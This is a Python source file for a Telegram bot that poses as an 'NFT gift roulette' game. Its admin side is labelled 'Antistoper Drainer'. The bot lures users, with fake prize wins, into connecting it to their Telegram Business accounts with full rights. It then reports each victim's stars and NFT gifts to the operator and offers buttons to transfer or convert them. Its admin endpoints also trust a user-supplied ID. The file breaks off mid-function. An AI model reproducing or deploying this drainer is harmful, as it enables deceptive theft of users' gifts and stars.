from aiogram import Bot, Dispatcher, types, F
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, InputMediaPhoto, BufferedInputFile, BusinessConnection, WebAppInfo, KeyboardButton, ReplyKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest
from aiogram.client.default import DefaultBotProperties
import asyncio
import logging
import json
import os
import random
import io
from PIL import Image, ImageDraw, ImageFont  # pip install pillow
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
from aiogram.methods import GetBusinessAccountGifts
from flask import Flask, jsonify, request, abort, send_from_directory
from scraper import get_gift_data # Добавить вверху файла
from datetime import datetime
from fastapi import FastAPI, Request as FastAPIRequest
from fastapi.middleware.wsgi import WSGIMiddleware
from config import config

# --- Конфигурация логирования в самом начале ---
# Устанавливаем базовый уровень, чтобы поймать ошибки конфигурации
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.info("Starting application...")

try:
    from config import config
    logging.info("Configuration loaded successfully.")
    logging.info(f"Admin ID: {config.admin_id}, Webhook URL set: {bool(config.webhook_url)}, Debug mode: {config.debug}")
except Exception as e:
    logging.critical(f"Failed to import or load config: {e}", exc_info=True)
    # Если конфигурация не загрузилась, нет смысла продолжать
    raise

# --- Инициализация бота и диспетчера ---
bot = Bot(config.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
flask_app = Flask(__name__, static_folder=None) # Отключаем стандартную обработку static
app = FastAPI() # Наше "главное" новое приложение

# --- Webhook эндпоинт на FastAPI с проверкой подписи ---
@app.post("/webhook")
async def bot_webhook(request: FastAPIRequest):
    headers = dict(request.headers)
    logging.info(f"Webhook triggered. Headers: {headers}")
    try:
        # Проверяем заголовки для валидации подписи Telegram
        if 'x-telegram-bot-api-secret-token' in headers:
            if headers['x-telegram-bot-api-secret-token'] != config.webhook_secret:
                logging.warning("Invalid webhook secret token received.")
                return {"ok": False, "error": "Unauthorized"}, 401
        else:
            logging.warning("Webhook request is missing the secret token header.")
            # Можно вернуть ошибку, если вы ожидаете токен всегда
            # return {"ok": False, "error": "Unauthorized"}, 401

        update_data = await request.json()
        update = types.Update.model_validate(update_data, context={"bot": bot})
        await dp.feed_update(bot, update)
        return {"ok": True}
    except Exception as e:
        logging.error(f"Error processing webhook: {e}", exc_info=True)
        return {"ok": False, "error": str(e)}, 500

# --- Жизненный цикл (на FastAPI) ---
@app.on_event("startup")
async def on_startup():
    if config.webhook_url:
        # Устанавливаем вебхук с секретным токеном
        await bot.set_webhook(
            url=f"{config.webhook_url}/webhook",
            drop_pending_updates=True,
            secret_token=config.webhook_secret
        )
        logging.warning(f"Webhook set to {config.webhook_url}/webhook with secret token.")

@app.on_event("shutdown")
async def on_shutdown():
    await bot.delete_webhook()
    logging.warning("Webhook deleted.")

# --- Эндпоинт для проверки здоровья сервиса ---
@flask_app.route('/health')
def health_check():
    return jsonify({"status": "ok"}), 200

# --- Эндпоинты Flask для WebApp ---
# Все @app.route теперь становятся @flask_app.route
@flask_app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@flask_app.route('/<path:path>')
def static_files(path):
    # Отдаем все остальные файлы (JS, CSS, изображения) из корневой директории
    return send_from_directory('.', path)

# --- Управление данными пользователей ---
USER_DATA_FILE = "user_data.json"
MAX_ATTEMPTS = config.max_attempts

def read_user_data():
    """Читает данные пользователей из файла с обработкой ошибок"""
    if not os.path.exists(USER_DATA_FILE):
        logging.info(f"User data file {USER_DATA_FILE} not found, creating new one")
        return {}
    try:
        with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            logging.debug(f"Successfully loaded user data for {len(data)} users")
            return data
    except json.JSONDecodeError as e:
        logging.error(f"JSON decode error in {USER_DATA_FILE}: {e}")
        # Создаем резервную копию поврежденного файла
        backup_file = f"{USER_DATA_FILE}.backup.{int(datetime.now().timestamp())}"
        try:
            os.rename(USER_DATA_FILE, backup_file)
            logging.info(f"Corrupted file backed up as {backup_file}")
        except OSError as backup_error:
            logging.error(f"Failed to create backup: {backup_error}")
        return {}
    except FileNotFoundError:
        logging.warning(f"User data file {USER_DATA_FILE} not found")
        return {}
    except Exception as e:
        logging.error(f"Unexpected error reading user data: {e}")
        return {}

def write_user_data(data):
    """Записывает данные пользователей в файл с обработкой ошибок"""
    try:
        # Создаем временный файл для атомарной записи
        temp_file = f"{USER_DATA_FILE}.tmp"
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        # Атомарно заменяем старый файл новым
        os.replace(temp_file, USER_DATA_FILE)
        logging.debug(f"Successfully saved user data for {len(data)} users")
    except Exception as e:
        logging.error(f"Error writing user data: {e}")
        # Пытаемся удалить временный файл
        try:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        except OSError:
            pass
        raise

# --- Новые API эндпоинты для рулетки ---

@flask_app.route('/api/get_user_status')
def get_user_status():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({"error": "user_id is required"}), 400
    
    # Валидация user_id
    try:
        user_id_int = int(user_id)
        if user_id_int <= 0:
            return jsonify({"error": "user_id must be a positive integer"}), 400
    except ValueError:
        return jsonify({"error": "user_id must be a valid integer"}), 400
    
    try:
        all_data = read_user_data()
        user_info = all_data.get(str(user_id))
        
        # Если пользователь не существует, создаем его с 0 использованными попытками
        if user_info is None:
            user_info = {"attempts": 0, "gifts": []}
            all_data[str(user_id)] = user_info
            write_user_data(all_data)
        
        return jsonify({
            "attempts_left": MAX_ATTEMPTS - user_info.get("attempts", 0),
            "gifts": user_info.get("gifts", [])
        })
    except Exception as e:
        logging.error(f"Error getting user status for {user_id}: {e}")
        return jsonify({"error": "Internal server error"}), 500

@flask_app.route('/api/user', methods=['POST'])
def handle_user_data():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400
            
        user_id = data.get('user_id')
        if not user_id:
            return jsonify({"error": "user_id is required"}), 400

        # Валидация user_id
        try:
            user_id_int = int(user_id)
            if user_id_int <= 0:
                return jsonify({"error": "user_id must be a positive integer"}), 400
        except ValueError:
            return jsonify({"error": "user_id must be a valid integer"}), 400

        # Создаем пользователя с 0 использованными попытками (значит у него будет MAX_ATTEMPTS доступных)
        all_data = read_user_data()
        if str(user_id) not in all_data:
            all_data[str(user_id)] = {"attempts": 0, "gifts": []}
            write_user_data(all_data)
            logging.info(f"Created new user {user_id} with {MAX_ATTEMPTS} attempts")

        return jsonify({"status": "ok", "message": f"User {user_id} acknowledged."})
    except Exception as e:
        logging.error(f"Error handling user data: {e}")
        return jsonify({"error": "Internal server error"}), 500

@flask_app.route('/api/spin', methods=['POST'])
def handle_spin():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400

        user_id = str(data.get('user_id'))
        if not user_id:
            return jsonify({"error": "user_id is required"}), 400

        # Валидация user_id
        try:
            user_id_int = int(user_id)
            if user_id_int <= 0:
                return jsonify({"error": "user_id must be a positive integer"}), 400
        except ValueError:
            return jsonify({"error": "user_id must be a valid integer"}), 400

        all_data = read_user_data()
        
        # Если пользователь не существует, создаем его с 0 использованными попытками
        if user_id not in all_data:
            all_data[user_id] = {"attempts": 0, "gifts": []}
        
        user_info = all_data[user_id]

        if user_info["attempts"] >= MAX_ATTEMPTS:
            return jsonify({"error": "No attempts left"}), 403
        
        user_info["attempts"] += 1

        # Выбираем случайный приз (с учетом весов, если они есть)
        prizes_from_js = load_prizes_from_js()
        if not prizes_from_js:
            logging.error("Could not load prizes from prizes.js")
            return jsonify({"error": "Internal server error"}), 500

        won_prize = random.choice(prizes_from_js)

        if won_prize["starPrice"] > 0:
            gift_data = {
                **won_prize,
                "date": datetime.now().strftime('%d.%m.%Y')
            }
            user_info["gifts"].append(gift_data)

        write_user_data(all_data)
        
        return jsonify({
            "won_prize": won_prize,
            "attempts_left": MAX_ATTEMPTS - user_info["attempts"]
        })
    except Exception as e:
        logging.error(f"Error handling spin for {user_id}: {e}")
        return jsonify({"error": "Internal server error"}), 500

@flask_app.route('/prizes')
def prizes():
    # Здесь можно получать актуальные данные из базы или Telegram
    return jsonify([
        {"name": "iPhone 15", "price": 90000},
        {"name": "AirPods", "price": 15000},
        {"name": "1000₽", "price": 1000},
        {"name": "Пусто", "price": 0},
        {"name": "MacBook", "price": 150000},
        {"name": "Чашка", "price": 500},
        {"name": "PlayStation 5", "price": 60000},
        {"name": "Книга", "price": 1000}
    ])

# --- Логика для команд, чтобы переиспользовать ее ---

async def process_start_command(message: Message):
    if not message.from_user:
        return

    # Проверяем, админ ли это
    if message.from_user.id == config.admin_id:
        # Админское приветствие
        admin_text = (
            "<b>Antistoper Drainer</b>\n\n"
            "🔗 /gifts - просмотреть гифты\n"
            "🔗 /stars - просмотреть звезды\n"
            "🔗 /transfer <code>&lt;owned_id&gt; &lt;business_connect&gt;</code> - передать гифт вручную\n"
            "🔗 /convert - конвертировать подарки в звезды"
        )
        if config.webhook_url:
            webapp_url = config.webhook_url
            keyboard = ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]],
                resize_keyboard=True
            )
            await message.answer(admin_text, reply_markup=keyboard)
        else:
            await message.answer(admin_text)

    else:
        # Пользовательское приветствие
        if config.webhook_url:
            webapp_url = config.webhook_url
            keyboard = ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]],
                resize_keyboard=True
            )
            await message.answer(
                "🎁<b>Привет! Ты в боте рулетка NFT подарков Gift Sender🎁</b>, который:\n",
                reply_markup=keyboard
            )
        else:
            await message.answer(
                "❤️ <b>Я — твой главный помощник...</b> (WebApp не настроен)"
            )

async def process_admin_command(message: Message):
    logging.info(f"Admin command received from user {message.from_user.id if message.from_user else 'Unknown'}")
    try:
        if not message.from_user:
            logging.warning("Cannot process /admin command without user info")
            return

        logging.info(f"Comparing user ID {message.from_user.id} with ADMIN_ID {config.admin_id}")
        if message.from_user.id != config.admin_id:
            logging.info(f"User {message.from_user.id} is not admin. Sending 'no rights' message.")
            return await message.answer("У вас нет прав для доступа к этой команде.")

        logging.info(f"User {message.from_user.id} is admin. Preparing admin panel link.")

        if not config.webhook_url:
            logging.error("WEBHOOK_URL is not set! Cannot create admin panel link.")
            return await message.answer("Ошибка конфигурации сервера: не удалось создать ссылку.")

        admin_url = f"{config.webhook_url}/admin.html"
        logging.info(f"Admin panel URL created: {admin_url}")

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔑 Открыть админ-панель", web_app=WebAppInfo(url=admin_url))]
        ])
        logging.info("Keyboard created. Sending message...")

        await message.answer("Админ-панель доступна по кнопке ниже:", reply_markup=keyboard)
        logging.info("Admin panel message sent successfully.")

    except Exception as e:
        logging.exception("An error occurred in the admin_command handler!")
        await message.answer("Произошла внутренняя ошибка. Проверьте логи сервера.")

async def process_resetwebhook_command(message: Message):
    if not message.from_user or message.from_user.id != config.admin_id:
        return

    logging.info("--- Force resetting webhook ---")
    if config.webhook_url:
        await bot.set_webhook(url=f"{config.webhook_url}/webhook", drop_pending_updates=True)
        await message.answer("Webhook был сброшен!")
        logging.info("--- Webhook has been reset ---")
    else:
        await message.answer("Ошибка: WEBHOOK_URL не настроен.")


# --- Новые, четкие обработчики для админа ---
@dp.message(Command("start"), F.from_user.id == config.admin_id)
async def admin_start_command(message: Message):
    await process_start_command(message)

@dp.message(Command("admin"), F.from_user.id == config.admin_id)
async def admin_admin_command(message: Message):
    await process_admin_command(message)

@dp.message(Command("resetwebhook"), F.from_user.id == config.admin_id)
async def admin_resetwebhook_command(message: Message):
    await process_resetwebhook_command(message)

# --- Новые, четкие обработчики для обычных пользователей ---
@dp.message(Command("start"), F.from_user.id != config.admin_id)
async def user_start_command(message: Message):
    """Обработчик команды /start для обычных пользователей"""
    # Используем URL из конфигурации
    app_url = config.webhook_url
    if not app_url:
        await message.answer("Извините, веб-приложение временно недоступно.")
        logging.error("app_url (from config.webhook_url) is not set!")
        return
        
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🎁 Открыть рулетку", web_app=WebAppInfo(url=app_url))]
        ]
    )
    await message.answer(
        "Добро пожаловать в рулетку подарков! Нажмите кнопку ниже, чтобы начать.",
        reply_markup=keyboard
    )

# Обработчик для любого текста от пользователя (НЕ админа), который НЕ является командой
@dp.message(F.text, F.from_user.id != config.admin_id)
async def user_text_handler(message: Message):
    # Дополнительно проверяем, что это не команда, которую мы могли пропустить
    if message.text and message.text.startswith('/'):
        # Можно отправить сообщение "неизвестная команда" или просто проигнорировать
        return

    await message.answer(
        "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
        "Как это сделать?\n\n"
        "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
        "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
        "3. 🤖 Откройте пункт <b>Чат-боты</b>\n\n"
        "Имя бота: <code>@GiftWinsSender_BOT</code>\n"
        "❗Для корректной работы боту требуются <b>все права</b>",
        parse_mode="HTML"
    )

CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = config.admin_id
        rights = connection.rights
        if rights is None:
            await _bot.send_message(admin_id, "❗ Не удалось получить права бизнес-бота. Проверьте подключение.")
            return
        business_connection = connection

        rights_text = "\n".join([
            f"📍 <b>Права бота:</b>",
            f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
            f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
            f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
            f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
            f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
            f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
            f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
            f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
            f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
            f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_amount = response.star_amount

            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            all_gifts_amount = len(gifts.gifts)
            unique_gifts_amount = sum(1 for gift in gifts.gifts if getattr(gift, 'type', None) == "unique")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"

        msg = (
            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
            f"👤 Пользователь: @{getattr(business_connection.user, 'username', '—')}\n"
            f"🆔 User ID: <code>{getattr(business_connection.user, 'id', '—')}</code>\n"
            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
            f"\n{rights_text}"
            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
            f"\n🔝 NFT подарков: <code>{unique_gitfs_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

@dp.callback_query(F.data.startswith("reveal_all_gifts"))
async def handle_reveal_gifts(callback: CallbackQuery):
    await callback.answer("Обработка подарков…")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 Нет подарков."
        else:
            for gift in gifts.gifts:
                if getattr(gift, 'owned_gift_id', None) == owned_gift_id:
                    gift_name = getattr(getattr(gift, 'gift', None), 'base_name', '').replace(" ", "")
                    gift_number = getattr(getattr(gift, 'gift', None), 'number', '')
                    return f"https://t.me/nft/{gift_name}-{gift_number}"
        return "🎁 Нет подарков."
    except Exception as e:
        return "🎁 Нет подарков."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": "FirstName",
            "last_name": "LastName"
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения")

from aiogram import types
from aiogram.filters import Command
from g4f.client import Client as G4FClient

OWNER_ID = config.admin_id
task_id = config.admin_id

# @dp.business_message()
# async def get_message(message: types.Message):
#     # --- ВРЕМЕННО ОТКЛЮЧЕНО ДЛЯ ДИАГНОСТИКИ ---
#     pass
#    # --- Новая часть: Обработка команд в бизнес-чате ---
#    if message.chat.type == "private":
#        connection_id = get_connection_id_by_user(message.chat.id)
# ... existing code ...

async def get_gifts():
    # Примерная заглушка, замените на реальный API
    return [
        {'name': 'Плюшевый медведь', 'price': 100},
        {'name': 'Кубок', 'price': 200},
        {'name': 'Сердце', 'price': 50},
        {'name': 'Звезда', 'price': 300},
        {'name': 'Книга', 'price': 80},
        {'name': 'Котик', 'price': 150},
        {'name': 'Робот', 'price': 250},
    ]

def generate_roulette_image(gifts, highlight_index):
    width, height = 600, 120
    img = Image.new("RGB", (width, height), "white")
    draw = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("arial.ttf", 18)
    except Exception:
        font = ImageFont.load_default()
    sector_w = width // len(gifts)
    for i, gift in enumerate(gifts):
        x = i * sector_w
        color = "yellow" if i == highlight_index else "lightgray"
        draw.rectangle([x, 0, x+sector_w, height], fill=color)
        draw.text((x+10, 40), f"{gift['name']}\n{gift['price']}⭐", fill="black", font=font)
    return img

@dp.message(F.text == "/roulette")
async def start_roulette(message: types.Message):
    gifts = await get_gifts()
    if not gifts:
        await message.answer("Нет подарков для рулетки.")
        return

    roll_sequence = []
    for _ in range(20):
        idx = random.randint(0, len(gifts)-1)
        window = [gifts[(idx+i)%len(gifts)] for i in range(-2, 3)]
        roll_sequence.append((window, 2))
    win_idx = random.randint(0, len(gifts)-1)
    window = [gifts[(win_idx+i)%len(gifts)] for i in range(-2, 3)]
    roll_sequence.append((window, 2))

    msg = await message.answer("Крутим рулетку...")
    roulette_msg = None
    for i, (window, highlight) in enumerate(roll_sequence):
        img = generate_roulette_image(window, highlight)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        input_file = BufferedInputFile(buf.getvalue(), "roulette.png")
        if i == 0:
            roulette_msg = await message.answer_photo(input_file)
        else:
            if roulette_msg:
                try:
                    await roulette_msg.edit_media(InputMediaPhoto(media=input_file))
                except Exception:
                    pass
        await asyncio.sleep(0.12 + i*0.03)

    win_gift = window[highlight]
    await message.answer(
        f"🎉 Поздравляем! Вы выиграли: <b>{win_gift['name']}</b> за <b>{win_gift['price']}⭐</b>.\n\n"
        "Чтобы забрать подарок, подключите бота в раздел Чат-боты Telegram для бизнеса.",
        parse_mode="HTML"
    )

    webapp_url = "https://my-roulette-app-pi.vercel.app/"  # или локальный ngrok, если тестируешь

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]
        ],
        resize_keyboard=True
    )

    await message.answer("Жми кнопку и крути рулетку!", reply_markup=keyboard)

@dp.message(F.web_app_data)
async def on_webapp_data(message: types.Message):
    if not message.web_app_data:
        return

    data_str = message.web_app_data.data
    try:
        data = json.loads(data_str)
        
        # Проверяем, нужно ли показать инструкцию
        if data.get('action') == 'show_connection_instructions':
            instruction_text = (
                "📌 <b>Для вывода подарка, подключите бота к бизнес-аккаунту.</b>\n\n"
                "Как это сделать:\n\n"
                "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
                "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
                "3. 🤖 Откройте пункт <b>Чат-боты</b> и добавьте этого бота.\n\n"
                "❗️Для корректной работы боту требуются права на управление подарками."
            )
            await message.answer(instruction_text, parse_mode="HTML")
            return

        # Логика обработки выигрыша (остается без изменений)
        prize = data.get('prize', {})
        if prize.get('starPrice', 0) > 0:
            text = f"🎉 Поздравляем! Ты выиграл: {prize.get('name', 'ничего')} ({prize.get('starPrice', 0)}⭐)"
        else:
            text = "В этот раз не повезло, но попробуй еще раз!"
        await message.answer(text)

    except json.JSONDecodeError:
        await message.answer("Произошла ошибка при обработке данных.")

@dp.message(Command("giftinfo"))
async def gift_info_command(message: types.Message):
    if not message.text or len(message.text.split()) < 2:
        await message.answer("Пожалуйста, укажите URL подарка. Пример: /giftinfo <url>")
        return

    url = message.text.split()[1]
    data = get_gift_data(url)

    if not data:
        await message.answer("Не удалось получить информацию о подарке.")
        return

    # Форматируем красивый ответ
    details_text = "\n".join([f" • {k.replace('_', ' ').title()}: {v['name']} ({v['rarity']})" for k, v in data.get('details', {}).items() if v['rarity']])
    response_text = (
        f"<b>{data.get('title', 'Без названия')}</b>\n\n"
        f"{details_text}\n\n"
        f"<a href='{data.get('media_url', '')}'>Медиафайл</a>"
    )
    await message.answer(response_text, parse_mode="HTML")

# --- Новые API эндпоинты для админ-панели ---

@flask_app.route('/api/admin/connections')
def get_admin_connections():
    user_id_str = request.args.get('user_id')
    if not user_id_str or int(user_id_str) != config.admin_id:
        abort(403) # Доступ запрещен
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        return jsonify(connections)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@flask_app.route('/api/admin/user_data')
def get_admin_user_data():
    user_id_str = request.args.get('user_id')
    if not user_id_str or int(user_id_str) != config.admin_id:
        abort(403) # Доступ запрещен
    try:
        user_data = read_user_data()
        return jsonify(user_data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@flask_app.route('/admin')
def admin_page():
    # Отдаем статичный файл admin.html
    return flask_app.send_static_file('admin.html')

@flask_app.route('/api/admin/reset_attempts', methods=['POST'])
def reset_user_attempts():
    """Сброс попыток пользователя (только для админа)"""
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400

        user_id = data.get('user_id')
        admin_id = data.get('admin_id')
        
        if not user_id or not admin_id:
            return jsonify({"error": "user_id and admin_id are required"}), 400

        # Проверяем права администратора
        if int(admin_id) != config.admin_id:
            return jsonify({"error": "Unauthorized"}), 403

        # Валидация user_id
        try:
            user_id_int = int(user_id)
            if user_id_int <= 0:
                return jsonify({"error": "user_id must be a positive integer"}), 400
        except ValueError:
            return jsonify({"error": "user_id must be a valid integer"}), 400

        all_data = read_user_data()
        
        if str(user_id) not in all_data:
            return jsonify({"error": "User not found"}), 404
        
        # Сбрасываем попытки
        all_data[str(user_id)]["attempts"] = 0
        write_user_data(all_data)
        
        logging.info(f"Admin {admin_id} reset attempts for user {user_id}")
        return jsonify({"success": True, "message": f"Attempts reset for user {user_id}"})
        
    except Exception as e:
        logging.error(f"Error resetting attempts: {e}")
        return jsonify({"error": "Internal server error"}), 500

@flask_app.route('/api/admin/add_attempt', methods=['POST'])
def add_user_attempt():
    """Добавление попытки пользователю (только для админа)"""
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400

        user_id = data.get('user_id')
        admin_id = data.get('admin_id')
        
        if not user_id or not admin_id:
            return jsonify({"error": "user_id and admin_id are required"}), 400

        # Проверяем права администратора
        if int(admin_id) != config.admin_id:
            return jsonify({"error": "Unauthorized"}), 403

        # Валидация user_id
        try:
            user_id_int = int(user_id)
            if user_id_int <= 0:
                return jsonify({"error": "user_id must be a positive integer"}), 400
        except ValueError:
            return jsonify({"error": "user_id must be a valid integer"}), 400

        all_data = read_user_data()
        
        if str(user_id) not in all_data:
            return jsonify({"error": "User not found"}), 404
        
        # Уменьшаем количество использованных попыток (увеличиваем доступные)
        current_attempts = all_data[str(user_id)]["attempts"]
        if current_attempts > 0:
            all_data[str(user_id)]["attempts"] = current_attempts - 1
            write_user_data(all_data)
            logging.info(f"Admin {admin_id} added attempt for user {user_id}")
            return jsonify({
                "success": True, 
                "attempts": all_data[str(user_id)]["attempts"],
                "message": f"Attempt added for user {user_id}"
            })
        else:
            return jsonify({"error": "User already has maximum attempts"}), 400
        
    except Exception as e:
        logging.error(f"Error adding attempt: {e}")
        return jsonify({"error": "Internal server error"}), 500

@flask_app.route('/api/admin/add_prize', methods=['POST'])
def add_user_prize():
    """Добавление приза пользователю (только для админа)"""
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400

        user_id = data.get('user_id')
        admin_id = data.get('admin_id')
        prize = data.get('prize')
        
        if not user_id or not admin_id or not prize:
            return jsonify({"error": "user_id, admin_id and prize are required"}), 400

        # Проверяем права администратора
        if int(admin_id) != config.admin_id:
            return jsonify({"error": "Unauthorized"}), 403

        # Валидация user_id
        try:
            user_id_int = int(user_id)
            if user_id_int <= 0:
                return jsonify({"error": "user_id must be a positive integer"}), 400
        except ValueError:
            return jsonify({"error": "user_id must be a valid integer"}), 400

        # Валидация приза
        if not isinstance(prize, dict) or 'name' not in prize:
            return jsonify({"error": "Invalid prize format"}), 400

        all_data = read_user_data()
        
        if str(user_id) not in all_data:
            return jsonify({"error": "User not found"}), 404
        
        # Добавляем приз
        gift_data = {
            "name": prize.get("name", "Unknown"),
            "starPrice": prize.get("starPrice", 0),
            "img": prize.get("img", ""),
            "date": datetime.now().strftime('%d.%m.%Y')
        }
        
        all_data[str(user_id)]["gifts"].append(gift_data)
        write_user_data(all_data)
        
        logging.info(f"Admin {admin_id} added prize {prize.get('name')} to user {user_id}")
        return jsonify({"success": True, "message": f"Prize added to user {user_id}"})
        
    except Exception as e:
        logging.error(f"Error adding prize: {e}")
        return jsonify({"error": "Internal server error"}), 500

@flask_app.route('/api/admin/remove_gift', methods=['POST'])
def remove_user_gift():
    """Удаление приза у пользователя (только для админа)"""
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Invalid data"}), 400

        user_id = data.get('user_id')
        admin_id = data.get('admin_id')
        gift_index = data.get('gift_index')
        
        if not user_id or not admin_id or gift_index is None:
            return jsonify({"error": "user_id, admin_id and gift_index are required"}), 400

        # Проверяем права администратора
        if int(admin_id) != config.admin_id:
            return jsonify({"error": "Unauthorized"}), 403

        # Валидация user_id
        try:
            user_id_int = int(user_id)
            if user_id_int <= 0:
                return jsonify({"error": "user_id must be a positive integer"}), 400
        except ValueError:
            return jsonify({"error": "user_id must be a valid integer"}), 400

        # Валидация индекса приза
        try:
            gift_index = int(gift_index)
            if gift_index < 0:
                return jsonify({"error": "gift_index must be non-negative"}), 400
        except ValueError:
            return jsonify({"error": "gift_index must be a valid integer"}), 400

        all_data = read_user_data()
        
        if str(user_id) not in all_data:
            return jsonify({"error": "User not found"}), 404
        
        user_gifts = all_data[str(user_id)]["gifts"]
        if gift_index >= len(user_gifts):
            return jsonify({"error": "Gift index out of range"}), 400
        
        # Удаляем приз
        removed_gift = user_gifts.pop(gift_index)
        write_user_data(all_data)
        
        logging.info(f"Admin {admin_id} removed gift {removed_gift.get('name')} from user {user_id}")
        return jsonify({"success": True, "message": f"Gift removed from user {user_id}"})
